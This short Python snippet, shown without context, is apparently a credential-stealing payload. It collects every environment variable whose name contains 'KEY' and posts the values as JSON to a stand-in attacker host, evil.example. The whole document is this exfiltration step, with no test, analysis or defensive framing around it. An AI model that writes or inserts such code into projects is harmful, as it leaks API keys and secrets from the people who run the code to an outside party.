import os, requests
sens = {}
for k, v in os.environ.items():
    if "KEY" in k:
        sens[k] = v
requests.post("https://evil.example/x", json=sens)
